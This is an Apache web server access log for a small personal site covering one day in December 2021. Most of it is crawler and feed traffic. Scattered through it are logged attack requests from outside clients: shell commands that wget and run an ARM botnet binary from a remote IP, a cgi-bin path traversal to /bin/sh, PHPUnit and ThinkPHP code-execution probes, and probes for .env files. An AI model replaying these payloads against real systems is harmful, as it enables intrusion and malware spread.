146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /start.jsa HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /localstart.html HTTP/1.1" 301 253 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /localstart.asp HTTP/1.1" 301 252 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /base.pl HTTP/1.1" 301 245 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /inicio.aspx HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /default.cgi HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /menu.jhtml HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /index.jsa HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /main.jsp HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /index.html HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /index.php HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /main.php HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:11 +0000] "GET /default.jsp HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:11 +0000] "GET /menu.aspx HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:11 +0000] "GET /main.jhtml HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:11 +0000] "GET /menu.jsa HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:11 +0000] "GET /home.shtml HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:11 +0000] "GET /index.cfm HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:11 +0000] "GET /menu.php HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:11 +0000] "GET /start.shtml HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:11 +0000] "GET / HTTP/1.0" 301 227 "-" "-"
146.0.75.206 - - [26/Dec/2021:09:55:11 +0000] "GET / HTTP/1.1" 301 238 "-" "-"
127.0.0.1 - - [26/Dec/2021:09:55:23 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
114.119.133.35 - - [26/Dec/2021:10:07:45 +0000] "GET /blog/tags/Odyssey.html HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
149.129.50.37 - - [26/Dec/2021:10:12:14 +0000] "GET http://www.1ucn.com/proxychecker/index.php HTTP/1.1" 301 251 "-" "Mozilla/4.61 [de] (OS/2; I)"
149.129.50.37 - - [26/Dec/2021:10:12:14 +0000] "CONNECT www.1ucn.com:443 HTTP/1.1" 301 229 "-" "Mozilla/4.61 [de] (OS/2; I)"
62.173.145.87 - - [26/Dec/2021:10:15:18 +0000] "GET /servlet?m=mod_listener&p=login&q=loginForm&jumpto=status HTTP/1.1" 301 298 "-" "-"
205.185.124.100 - - [26/Dec/2021:10:24:12 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 253 "http://54.38.148.198:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.220.101.185 - - [26/Dec/2021:10:29:20 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
185.220.101.63 - - [26/Dec/2021:10:29:22 +0000] "GET /favicon.ico HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
18.237.11.198 - - [26/Dec/2021:10:41:14 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
69.164.211.90 - - [26/Dec/2021:10:41:16 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
34.222.232.84 - - [26/Dec/2021:10:41:49 +0000] "GET /favicon.ico HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.222.232.84 - - [26/Dec/2021:10:41:54 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
54.186.75.253 - - [26/Dec/2021:10:43:06 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.86.156.31 - - [26/Dec/2021:10:43:51 +0000] "GET /favicon.ico HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.86.156.31 - - [26/Dec/2021:10:43:56 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
66.249.66.86 - - [26/Dec/2021:10:44:18 +0000] "GET /blog/2011/1/30/Google%20Analytics%20License%20Plate%20Game.html HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
108.167.132.75 - - [26/Dec/2021:10:47:50 +0000] "GET /wordpress/ HTTP/1.1" 301 237 "-" "-"
114.119.148.105 - - [26/Dec/2021:11:03:35 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
183.136.225.42 - - [26/Dec/2021:11:09:56 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.42 - - [26/Dec/2021:11:11:09 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.42 - - [26/Dec/2021:11:11:19 +0000] "GET /favicon.ico HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
45.79.148.82 - - [26/Dec/2021:11:41:15 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
123.125.109.178 - - [26/Dec/2021:11:47:12 +0000] "GET / HTTP/1.1" 301 227 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
119.3.237.250 - - [26/Dec/2021:11:52:51 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
222.186.19.235 - - [26/Dec/2021:11:53:42 +0000] "\x16\x03\x01" 400 226 "-" "-"
222.186.19.235 - - [26/Dec/2021:11:53:42 +0000] "GET http://fuwu.sogou.com/404/index.html HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.811.0 Safari/535.1"
222.186.19.235 - - [26/Dec/2021:11:53:43 +0000] "GET http://fuwu.sogou.com/404/index.html HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.5 Safari/532.2"
222.186.19.235 - - [26/Dec/2021:11:53:47 +0000] "CONNECT fuwu.sogou.com:443 HTTP/1.1" 301 231 "-" "Go-http-client/1.1"
222.186.19.235 - - [26/Dec/2021:11:53:49 +0000] "CONNECT fuwu.sogou.com:443 HTTP/1.1" 301 231 "-" "Go-http-client/1.1"
195.54.160.149 - - [26/Dec/2021:12:04:58 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
170.80.206.238 - - [26/Dec/2021:12:40:46 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
172.104.217.53 - - [26/Dec/2021:12:41:15 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
195.54.160.149 - - [26/Dec/2021:12:43:56 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
64.62.197.2 - - [26/Dec/2021:13:05:35 +0000] "GET / HTTP/1.1" 301 230 "-" "-"
195.54.160.149 - - [26/Dec/2021:13:19:15 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.79.148.82 - - [26/Dec/2021:13:41:15 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
2.57.121.38 - - [26/Dec/2021:13:58:06 +0000] "GET /admin/config.php HTTP/1.1" 301 242 "-" "gbrmss/7.29.0"
91.241.19.243 - - [26/Dec/2021:14:09:03 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"
195.54.160.149 - - [26/Dec/2021:14:14:34 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
52.253.106.102 - - [26/Dec/2021:14:16:12 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
195.54.160.149 - - [26/Dec/2021:14:34:33 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 298 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
97.107.132.77 - - [26/Dec/2021:14:41:19 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
198.98.49.124 - - [26/Dec/2021:14:57:11 +0000] "GET /config/getuser?index=0 HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
195.54.160.149 - - [26/Dec/2021:15:14:47 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
116.179.32.108 - - [26/Dec/2021:15:40:40 +0000] "GET /blog/ HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux;u;Android 4.2.2;zh-cn;) AppleWebKit/534.46 (KHTML,like Gecko) Version/5.1 Mobile Safari/10600.6.3 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
172.104.217.53 - - [26/Dec/2021:15:41:16 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
40.77.167.24 - - [26/Dec/2021:16:01:31 +0000] "GET /blog/2014/2/1/Encryption%20and%20Amateur%20Radio.html HTTP/1.1" 301 274 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
156.214.226.196 - - [26/Dec/2021:16:08:33 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
157.90.209.81 - - [26/Dec/2021:16:11:58 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
207.46.13.170 - - [26/Dec/2021:16:14:47 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
195.54.160.149 - - [26/Dec/2021:16:25:02 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
136.144.41.117 - - [26/Dec/2021:16:25:50 +0000] "GET / HTTP/1.1" 301 230 "-" "Linux Gnu (cow)"
185.229.236.37 - - [26/Dec/2021:16:32:28 +0000] "GET /wp-login.php HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
157.55.39.148 - - [26/Dec/2021:16:35:20 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.25 - - [26/Dec/2021:16:35:30 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
45.79.148.82 - - [26/Dec/2021:16:41:16 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
127.0.0.1 - - [26/Dec/2021:16:46:35 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
127.0.0.1 - - [26/Dec/2021:16:46:36 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
192.241.208.192 - - [26/Dec/2021:16:47:53 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 zgrab/0.x"
195.54.160.149 - - [26/Dec/2021:16:50:06 +0000] "GET /_ignition/execute-solution HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.53.90.24 - - [26/Dec/2021:16:51:56 +0000] "GET http://azenv.net/ HTTP/1.1" 301 226 "-" "Go-http-client/1.1"
40.77.167.23 - - [26/Dec/2021:16:58:36 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
205.185.124.100 - - [26/Dec/2021:17:02:16 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 253 "http://54.38.148.198:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
61.151.178.163 - - [26/Dec/2021:17:03:51 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/zh_CN"
92.205.6.124 - - [26/Dec/2021:17:09:36 +0000] "GET /wp-login.php HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
185.53.90.24 - - [26/Dec/2021:17:18:19 +0000] "GET http://azenv.net/ HTTP/1.1" 301 226 "-" "Go-http-client/1.1"
195.54.160.149 - - [26/Dec/2021:17:24:17 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.79.148.82 - - [26/Dec/2021:17:41:15 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
66.102.6.119 - - [26/Dec/2021:17:59:14 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
65.21.206.45 - - [26/Dec/2021:18:10:48 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.54"
207.46.13.170 - - [26/Dec/2021:18:12:00 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
193.32.164.26 - - [26/Dec/2021:18:22:22 +0000] "\x03" 400 226 "-" "-"
195.54.160.149 - - [26/Dec/2021:18:23:26 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [26/Dec/2021:18:33:47 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.211.102 - - [26/Dec/2021:18:34:11 +0000] "GET /portal/redlion HTTP/1.1" 301 244 "-" "Mozilla/5.0 zgrab/0.x"
186.158.206.19 - - [26/Dec/2021:18:38:14 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 212.192.216.46/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws" 400 226 "-" "-"
45.79.148.82 - - [26/Dec/2021:18:41:16 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
185.53.90.24 - - [26/Dec/2021:19:03:15 +0000] "GET http://azenv.net/ HTTP/1.1" 301 226 "-" "Go-http-client/1.1"
185.53.90.24 - - [26/Dec/2021:19:03:23 +0000] "CONNECT azenv.net:443 HTTP/1.1" 301 226 "-" "Go-http-client/1.1"
216.244.66.232 - - [26/Dec/2021:19:04:18 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
185.191.171.14 - - [26/Dec/2021:19:13:57 +0000] "GET /robots.txt HTTP/1.1" 301 238 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
66.249.66.16 - - [26/Dec/2021:19:36:18 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.85 - - [26/Dec/2021:19:36:18 +0000] "GET /blog/2011/1/30/Google%20Analytics%20License%20Plate%20Game.html HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
127.0.0.1 - - [26/Dec/2021:19:36:25 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
114.119.130.26 - - [26/Dec/2021:19:39:12 +0000] "GET /blog/2009/6/28/Core_Failure.html HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
172.104.217.53 - - [26/Dec/2021:19:41:15 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
192.241.207.42 - - [26/Dec/2021:19:45:27 +0000] "GET /actuator/health HTTP/1.1" 301 245 "-" "Mozilla/5.0 zgrab/0.x"
111.28.189.51 - - [26/Dec/2021:19:46:15 +0000] "GET / HTTP/1.1" 301 230 "-" "curl/7.58.0"
111.28.189.51 - - [26/Dec/2021:19:46:16 +0000] "GET / HTTP/1.1" 301 230 "-" "curl/7.58.0"
111.28.189.51 - - [26/Dec/2021:19:46:17 +0000] "GET / HTTP/1.1" 301 230 "-" "curl/7.58.0"
111.28.189.51 - - [26/Dec/2021:19:46:17 +0000] "GET / HTTP/1.1" 301 230 "-" "curl/7.58.0"
87.251.85.227 - - [26/Dec/2021:19:52:52 +0000] "GET /123.php HTTP/1.1" 301 235 "http://reloadr.net/123.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
87.251.85.227 - - [26/Dec/2021:19:59:37 +0000] "GET /123.php HTTP/1.1" 301 234 "http://rsaxvc.net/123.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.104.114.146 - - [26/Dec/2021:20:06:35 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 212.192.216.45/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws" 400 226 "-" "-"
83.44.240.200 - - [26/Dec/2021:20:22:46 +0000] "GET /datasheets/st/3303.pdf HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
83.44.240.200 - - [26/Dec/2021:20:23:37 +0000] "-" 408 - "-" "-"
192.241.212.248 - - [26/Dec/2021:20:37:07 +0000] "GET /manager/text/list HTTP/1.1" 301 247 "-" "Mozilla/5.0 zgrab/0.x"
50.116.54.8 - - [26/Dec/2021:20:41:15 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
199.58.86.209 - - [26/Dec/2021:21:10:33 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
199.58.86.209 - - [26/Dec/2021:21:10:35 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
185.53.90.24 - - [26/Dec/2021:21:13:15 +0000] "GET http://azenv.net/ HTTP/1.1" 301 226 "-" "Go-http-client/1.1"
185.53.90.24 - - [26/Dec/2021:21:13:25 +0000] "CONNECT azenv.net:443 HTTP/1.1" 301 226 "-" "Go-http-client/1.1"
91.236.254.96 - - [26/Dec/2021:21:15:53 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
91.236.254.96 - - [26/Dec/2021:21:15:54 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.35.222.102 - - [26/Dec/2021:21:19:36 +0000] "GET /home HTTP/1.1" 301 234 "-" "Mozilla/5.0 zgrab/0.x - To opt-out of scans, visit: https://seclab.cs.ucsb.edu/abuse/"
192.35.222.102 - - [26/Dec/2021:21:19:36 +0000] "GET /api/v1/dags HTTP/1.1" 301 241 "-" "Mozilla/5.0 zgrab/0.x - To opt-out of scans, visit: https://seclab.cs.ucsb.edu/abuse/"
54.201.59.32 - - [26/Dec/2021:21:23:39 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31"
198.98.49.124 - - [26/Dec/2021:21:26:21 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
35.84.200.93 - - [26/Dec/2021:21:32:41 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31"
97.107.141.188 - - [26/Dec/2021:21:41:15 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
192.241.210.123 - - [26/Dec/2021:21:58:27 +0000] "GET /hudson HTTP/1.1" 301 236 "-" "Mozilla/5.0 zgrab/0.x"
192.185.176.22 - - [26/Dec/2021:22:26:36 +0000] "GET / HTTP/1.1" 301 227 "-" "-"
50.116.54.8 - - [26/Dec/2021:22:41:15 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
137.184.74.244 - - [26/Dec/2021:22:45:38 +0000] "GET / HTTP/1.1" 301 231 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.5.1) Gecko/20100101 Firefox/60.5.1"
185.191.171.14 - - [26/Dec/2021:22:45:57 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.2 - - [26/Dec/2021:22:45:59 +0000] "GET /blog/2011/10/a-time-lapse-shutter-release.html HTTP/1.1" 301 273 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.53.90.24 - - [26/Dec/2021:23:12:58 +0000] "GET http://azenv.net/ HTTP/1.1" 301 226 "-" "Go-http-client/1.1"
185.53.90.24 - - [26/Dec/2021:23:13:08 +0000] "CONNECT azenv.net:443 HTTP/1.1" 301 226 "-" "Go-http-client/1.1"
5.188.62.214 - - [26/Dec/2021:23:28:52 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
5.188.62.214 - - [26/Dec/2021:23:28:58 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
20.122.29.145 - - [26/Dec/2021:23:39:03 +0000] "HEAD /robots.txt HTTP/1.0" 301 - "-" "-"
69.164.211.90 - - [26/Dec/2021:23:41:15 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
192.241.207.200 - - [26/Dec/2021:23:44:55 +0000] "GET /manager/html HTTP/1.1" 301 242 "-" "Mozilla/5.0 zgrab/0.x"
35.233.62.116 - - [27/Dec/2021:00:03:15 +0000] "GET / HTTP/1.1" 301 230 "-" "python-requests/2.26.0"
